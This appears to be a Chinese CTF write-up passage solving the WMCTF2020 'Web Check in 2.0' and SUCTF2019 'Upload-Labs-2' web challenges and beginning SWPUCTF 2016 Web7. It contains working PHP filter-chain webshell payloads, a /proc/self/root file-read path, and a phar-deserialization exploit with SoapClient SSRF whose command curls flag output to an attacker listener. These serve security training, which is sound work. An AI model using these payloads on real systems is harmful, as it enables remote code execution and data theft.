<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/var/</span>www<span class="regexp">/html/</span>flag.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>原理可参考<a href="https://www.anquanke.com/post/id/213235">https://www.anquanke.com/post/id/213235</a></p>
<h2 id="WMCTF2020-Web-Check-in-2-0"><a href="#WMCTF2020-Web-Check-in-2-0" class="headerlink" title="[WMCTF2020]Web Check in 2.0"></a>[WMCTF2020]Web Check in 2.0</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 7.0.33 Apache/2.4.25</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sandbox</span> = <span class="string">&#x27;/var/www/html/sandbox/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">@mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">@chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">var_dump(<span class="string">&quot;Sandbox:&quot;</span>.<span class="variable">$sandbox</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,<span class="variable">$content</span>))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$content</span>))</span><br><span class="line">        <span class="keyword">require_once</span>(<span class="variable">$content</span>);</span><br><span class="line">    file_put_contents(<span class="variable">$content</span>,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>方法一：两次urldecode编码绕过</p>
<p>通过查看伪协议处理的源码👇</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">static</span> <span class="keyword">void</span> php_stream_apply_filter_list(php_stream *stream, char *filterlist, <span class="keyword">int</span> read_chain, <span class="keyword">int</span> write_chain) <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">&#123;</span><br><span class="line">	char *p, *token = <span class="literal">NULL</span>;</span><br><span class="line">	php_stream_filter *temp_filter;</span><br><span class="line"></span><br><span class="line">	p = php_strtok_r(filterlist, <span class="string">&quot;|&quot;</span>, &amp;token);</span><br><span class="line">	<span class="keyword">while</span> (p) &#123;</span><br><span class="line">		php_url_decode(p, strlen(p));<span class="comment">#👈对过滤器进行了一次urldecode</span></span><br><span class="line">		<span class="keyword">if</span> (read_chain) &#123;</span><br><span class="line">			<span class="keyword">if</span> ((temp_filter = php_stream_filter_create(p, <span class="literal">NULL</span>, php_stream_is_persistent(stream)))) &#123;</span><br><span class="line">				php_stream_filter_append(&amp;stream-&gt;readfilters, temp_filter);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				php_error_docref(<span class="literal">NULL</span>, E_WARNING, <span class="string">&quot;Unable to create filter (%s)&quot;</span>, p);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (write_chain) &#123;</span><br><span class="line">			<span class="keyword">if</span> ((temp_filter = php_stream_filter_create(p, <span class="literal">NULL</span>, php_stream_is_persistent(stream)))) &#123;</span><br><span class="line">				php_stream_filter_append(&amp;stream-&gt;writefilters, temp_filter);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				php_error_docref(<span class="literal">NULL</span>, E_WARNING, <span class="string">&quot;Unable to create filter (%s)&quot;</span>, p);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		p = php_strtok_r(<span class="literal">NULL</span>, <span class="string">&quot;|&quot;</span>, &amp;token);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>file_put_contents中可以调用伪协议，而伪协议处理时会对过滤器urldecode一次，所以是可以利用二次编码绕过的 ，题目过滤了%25 ，很好绕过</p>
<p><img src="https://img.npfs06.top/20210326161153.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$char</span> = <span class="string">&#x27;r&#x27;</span>; <span class="comment">#构造r的二次编码</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$ascii1</span> = <span class="number">0</span>; <span class="variable">$ascii1</span> &lt; <span class="number">256</span>; <span class="variable">$ascii1</span>++) &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$ascii2</span> = <span class="number">0</span>; <span class="variable">$ascii2</span> &lt; <span class="number">256</span>; <span class="variable">$ascii2</span>++) &#123;</span><br><span class="line">		<span class="variable">$aaa</span> = <span class="string">&#x27;%&#x27;</span>.<span class="variable">$ascii1</span>.<span class="string">&#x27;%&#x27;</span>.<span class="variable">$ascii2</span>;</span><br><span class="line">		<span class="keyword">if</span>(urldecode(urldecode(<span class="variable">$aaa</span>)) == <span class="variable">$char</span>)&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$char</span>.<span class="string">&#x27;: &#x27;</span>.<span class="variable">$aaa</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>payload:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?content=php:<span class="regexp">//</span>filter<span class="regexp">/write=string.%2572ot13|&lt;?cuc @riny($_TRG[_]);?&gt;/</span>resource=npfs.php </span><br><span class="line"></span><br><span class="line">?content=npfs.php&amp;_=system(<span class="string">&quot;ls /&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>注意每利用一次文件，就要重新包含一次</span><br></pre></td></tr></table></figure>


<p>方法二：过滤器构造绕过</p>
<p>题目中过滤的过滤器有👇</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">/iconv|<span class="type">UCS</span>|<span class="type">UTF</span>|<span class="type">rot</span>|<span class="type">quoted</span>|<span class="type">base64</span>/</span><br></pre></td></tr></table></figure>
<p><code>php:filter</code>支持使用多个过滤器，参考官方文档 <a href="https://www.php.net/manual/zh/filters.php">可用过滤器列表</a>，还留下了<strong>字符串过滤器中的部分</strong>和<strong>压缩过滤器</strong>以及<strong>加密过滤器</strong>，这里考虑用<code>zlib</code>的<code>zlib.deflate</code>和<code>zlib.inflate</code>，组合使用压缩后再解压后内容肯定不变，不过我们可以在中间遍历一下剩下的几个过滤器，看看中间进行什么操作会影响后续inflate的内容，简单遍历一下可以发现中间插入string.tolower转后会把空格和exit处理了就可以绕过exit👇</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?content=php:<span class="comment">//filter/zlib.deflate|string.tolower|zlib.inflate|<span class="meta">?&gt;</span><span class="meta">&lt;?php</span>%0deval($_GET[1]);<span class="meta">?&gt;</span>/resource=npfs.php</span></span><br><span class="line"></span><br><span class="line">?content=npfs.php&amp;<span class="number">1</span>=system(<span class="string">&#x27;ls /&#x27;</span>);</span><br></pre></td></tr></table></figure>




<h2 id="suctf2019-Upload-Labs-2"><a href="#suctf2019-Upload-Labs-2" class="headerlink" title="suctf2019-Upload-Labs-2"></a>suctf2019-Upload-Labs-2</h2><p>首先是一个文件上传，有三点限制</p>
<ul>
<li>后缀只能是gif,jpeg,jpg,png</li>
<li>检查了MIME类型，抓包改下即可</li>
<li>文件内容不能出现&lt;?，但是限制的很不严谨</li>
</ul>
<p>index.php</p>
<p><img src="https://img.npfs06.top/20210327160926.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>class.php</p>
<p><img src="https://img.npfs06.top/20210327160618.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>然后在func,php有一个查看上传文件类型的功能</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">func.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;submit&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;url&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Go away!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$file_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> File(<span class="variable">$file_path</span>);</span><br><span class="line">        <span class="variable">$file</span>-&gt;getMIME();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Your file type is &#x27;<span class="subst">$file</span>&#x27; &lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//主要就是限制了各种协议，然后实例化了File类，调用了getMIME()方法</span></span><br></pre></td></tr></table></figure>
<p>跟进到File类和getMIME()方法看看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$type</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&quot;Check&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file_name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = <span class="variable">$file_name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$class</span> = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable">$class</span>-&gt;newInstanceArgs(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        <span class="variable">$a</span>-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getMIME</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$finfo</span> = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;type = finfo_file(<span class="variable">$finfo</span>, <span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        finfo_close(<span class="variable">$finfo</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>finfo_file,看一看这个函数的c源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> FILEINFO_MODE_FILE:</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">/* determine if the file is a local file or remote URL */</span></span><br><span class="line">			<span class="keyword">const</span> <span class="keyword">char</span> *tmp2;</span><br><span class="line">			php_stream_wrapper *wrap;</span><br><span class="line">			php_stream_statbuf ssb;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (buffer == <span class="literal">NULL</span> || !*buffer) &#123;</span><br><span class="line">				php_error_docref(<span class="literal">NULL</span>, E_WARNING, <span class="string">&quot;Empty filename or path&quot;</span>);</span><br><span class="line">				RETVAL_FALSE;</span><br><span class="line">				<span class="keyword">goto</span> clean;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (CHECK_NULL_PATH(buffer, buffer_len)) &#123;</span><br><span class="line">				php_error_docref(<span class="literal">NULL</span>, E_WARNING, <span class="string">&quot;Invalid path&quot;</span>);</span><br><span class="line">				RETVAL_FALSE;</span><br><span class="line">				<span class="keyword">goto</span> clean;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			wrap = php_stream_locate_url_wrapper(buffer, &amp;tmp2, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>其中调用了php_stream_locate_url_wrapper这个函数<br>在<a href="https://blog.zsxsoft.com/post/38">https://blog.zsxsoft.com/post/38</a> 中讲了，使用了php_stream_locate_url_wrapper的php函数，都会存在phar反序列化的问题<br>phar反序列化如何触发一个ssrf呢，这里可以利用到SoapClient的CRLF注入漏洞</p>
<p>而后就是 admin.php 中令人异常疑惑的四段代码了：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$reflect</span> = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;clazz);</span><br><span class="line"><span class="keyword">$this</span>-&gt;instance = <span class="variable">$reflect</span>-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line"><span class="variable">$reflectionMethod</span> = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func1);</span><br><span class="line"><span class="variable">$reflectionMethod</span>-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line"><span class="variable">$reflectionMethod</span> = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func2);</span><br><span class="line"><span class="variable">$reflectionMethod</span>-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg2);</span><br><span class="line"></span><br><span class="line"><span class="variable">$reflectionMethod</span> = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func3);</span><br><span class="line"><span class="variable">$reflectionMethod</span>-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg3);</span><br></pre></td></tr></table></figure>
<p>ReflectionClass，是一个反射类，能将参数实例化</p>
<p>而ReflectionClass::newInstanceArgs相当于用来赋值</p>
<p><img src="https://img.npfs06.top/20210327221043.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>有什么用呢？用<code>__wakeup</code>，需要想办法去触发反序列化。然而这四段代码其实正好对应了：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> mysqli();</span><br><span class="line"><span class="variable">$m</span>-&gt;init();</span><br><span class="line"><span class="variable">$m</span>-&gt;real_connect(<span class="string">&#x27;ip&#x27;</span>,<span class="string">&#x27;select 1&#x27;</span>,<span class="string">&#x27;select 1&#x27;</span>,<span class="string">&#x27;select 1&#x27;</span>,<span class="number">3306</span>);</span><br><span class="line"><span class="variable">$m</span>-&gt;query(<span class="string">&#x27;select 1;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>其实也就是 @LoRexxar’ 在 Tsec 上进行的分享 <a href="https://paper.seebug.org/998/">Comprehensive analysis of the mysql client attack chain</a> 的内容了，@zsx 文章中指出</p>
<p><img src="https://img.npfs06.top/20210327221533.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>既然可以这么触发，那么 Rogue Mysql 的攻击当然适用于 phar 反序列化了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$reflect</span> = <span class="keyword">new</span> ReflectionClass(<span class="string">&#x27;Mysqli&#x27;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="variable">$reflect</span>-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line"><span class="variable">$reflectionMethod</span> = <span class="keyword">new</span> ReflectionMethod(<span class="string">&#x27;Mysqli&#x27;</span>, <span class="string">&#x27;init&#x27;</span>);</span><br><span class="line"><span class="variable">$reflectionMethod</span>-&gt;invoke(<span class="variable">$sql</span>, <span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$reflectionMethod</span> = <span class="keyword">new</span> ReflectionMethod(<span class="string">&#x27;Mysqli&#x27;</span>, <span class="string">&#x27;real_connect&#x27;</span>);</span><br><span class="line"><span class="variable">$reflectionMethod</span>-&gt;invoke(<span class="variable">$sql</span>, <span class="string">&#x27;ip&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;3306&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$reflectionMethod</span> = <span class="keyword">new</span> ReflectionMethod(<span class="string">&#x27;Mysqli&#x27;</span>, <span class="string">&#x27;query&#x27;</span>);</span><br><span class="line"><span class="variable">$reflectionMethod</span>-&gt;invoke(<span class="variable">$sql</span>, <span class="string">&#x27;select 1&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>先给exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func=<span class="string">&#x27;SoapClient&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1/admin.php&quot;</span>;</span><br><span class="line">        <span class="variable">$post_string</span> = <span class="string">&#x27;admin=&amp;cmd=curl http://xxx.xxx.xxx.xxx:2333/?`/readflag`&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3=&#x27;</span>. <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">        <span class="variable">$headers</span> = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name=[</span><br><span class="line">            <span class="literal">null</span>,</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">                <span class="string">&#x27;user_agent&#x27;</span>=&gt;str_replace(<span class="string">&#x27;^^&#x27;</span>, <span class="string">&quot;\r\n&quot;</span>,<span class="string">&#x27;w4nder^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;Content-Length: &#x27;</span>. (<span class="keyword">string</span>)strlen(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>.<span class="string">&#x27;^^&#x27;</span>)</span><br><span class="line">                ,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> File();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">@unlink(<span class="string">&quot;1.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;1.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;script language=&#x27;php&#x27;&gt; __HALT_COMPILER(); &lt;/script&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">&#x27;1.phar&#x27;</span>,<span class="string">&#x27;1.jpg&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>生成phar上传，然后来到func.php，可以用php://filter/resource=phar://绕过过滤，输入： </p>
<blockquote>
<p>php://filter/resource=phar://upload/xxxxxxxxxxx/xxxxxxxxxxx.jpg</p>
</blockquote>
<p>同时开启监听，即可得到flag</p>
<p>总的来说就是，想要读到 flag 就必须反序列化 Ad 类，可以利用的反序列化只有 phar。而 Ad 类是实现 MySQL 连接的地方，这就可以使用 MySQL 客户端攻击，让 admin.php 连接到一个伪造的 MySQL 服务端，然后在这个伪造的服务端用 phar:// 读取 phar 文件，从而触发 Ad() 类的反序列化。</p>
<p>要想让 admin.php 连接伪造的 MySQL 服务端，就要让 REMOTE_ADDR 为 127.0.0.1，即本地访问，而在 File 类中的 __wakeup() 恰好可以提供 Soap Client 反序列化实现 SSRF，接下来就是如何让 File() 类反序列化。</p>
<p>可以看到 File() 类的 getMIME() 函数使用了 finfo_file() 函数，这个函数可以触发 phar 反序列化，但是在 fuc.php <code>不能传 phar:// 开头的字符串</code>，这里就可以使用 <code>php://filter/resource=......</code> 进行绕过，而对于文件内容不能有 <code>&lt;?</code> 则可以使用 <code>&lt;script language=&#39;php&#39;&gt;__HALT_COMPILER();&lt;/script&gt;</code> 绕过</p>
<p>整体就是通过 File 触发 Soap 访问 admin.php，接着触发 Mysql Client Attack，再触发 phar 即可</p>
<p>参考：<a href="https://v2as.com/article/dc469a53-27f0-4695-bd51-677f690190d3">https://v2as.com/article/dc469a53-27f0-4695-bd51-677f690190d3</a></p>
<h2 id="SWPUCTF-2016-Web7"><a href="#SWPUCTF-2016-Web7" class="headerlink" title="[SWPUCTF 2016]Web7"></a>[SWPUCTF 2016]Web7</h2><p>源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"><span class="keyword">import</span> cherrypy</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web7</span>:</span></span><br><span class="line"><span class="meta">    @cherrypy.expose</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt; window.location.href=&#x27;/input&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line"><span class="meta">    @cherrypy.expose</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">input</span>(<span class="params">self,url=<span class="string">&quot;&quot;</span>,submit=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">        file=<span class="built_in">open</span>(<span class="string">&quot;index.html&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">        reheaders=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> cherrypy.request.method==<span class="string">&quot;GET&quot;</span>:</span><br><span class="line">            reheaders=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            url=cherrypy.request.params[<span class="string">&quot;url&quot;</span>]</span><br><span class="line">            submit=cherrypy.request.params[<span class="string">&quot;submit&quot;</span>]</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> urllib2.urlopen(url).info().headers:</span><br><span class="line">                    reheaders=reheaders+x+<span class="string">&quot;&lt;br&gt;&quot;</span></span><br><span class="line">            <span class="keyword">except</span> Exception,e:</span><br><span class="line">                reheaders=<span class="string">&quot;错误&quot;</span>+<span class="built_in">str</span>(e)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> urllib2.urlopen(url).info().headers:</span><br><span class="line">                reheaders=reheaders+x+<span class="string">&quot;&lt;br&gt;&quot;</span></span><br><span class="line">        file=file.replace(<span class="string">&quot;&lt;?response?&gt;&quot;</span>,reheaders)</span><br><span class="line">        <span class="keyword">return</span> file</span><br><span class="line"><span class="meta">    @cherrypy.expose</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">self,password=<span class="string">&quot;&quot;</span>,submit=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">        pool = redis.ConnectionPool(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">6379</span>)</span><br><span class="line">        r = redis.Redis(connection_pool=pool)</span><br><span class="line">        re=<span class="string">&quot;&quot;</span></span><br><span class="line">        file=<span class="built_in">open</span>(<span class="string">&quot;login.html&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">        <span class="keyword">if</span> cherrypy.request.method==<span class="string">&quot;GET&quot;</span>:</span><br><span class="line">            re=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            password=cherrypy.request.params[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">            submit=cherrypy.request.params[<span class="string">&quot;submit&quot;</span>]</span><br><span class="line">            <span class="keyword">if</span> r.get(<span class="string">&quot;admin&quot;</span>)==password:</span><br><span class="line">                re=<span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&#x27;r&#x27;</span>).readline()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                re=<span class="string">&quot;Can&#x27;t find admin:&quot;</span>+password+<span class="string">&quot;,fast fast fast.....&quot;</span></span><br><span class="line">        file=file.replace(<span class="string">&quot;&lt;?response?&gt;&quot;</span>,re)</span><br><span class="line">        <span class="keyword">return</span> file</span><br><span class="line">cherrypy.config.update(&#123;<span class="string">&#x27;server.socket_host&#x27;</span>: <span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;server.socket_port&#x27;</span>: <span class="number">8080</span>,</span><br><span class="line">                       &#125;)</span><br><span class="line">cherrypy.quickstart(web7(),<span class="string">&#x27;/&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>两个页面，一个<code>/input</code>允许我们输入URL，然后会用urllib2.urlopen()访问我们的URL。还有一个<code>/login</code>，要求我们输入管理员的密码,如果与Redis数据库中的密码相同，我们就可以拿到Flag</p>
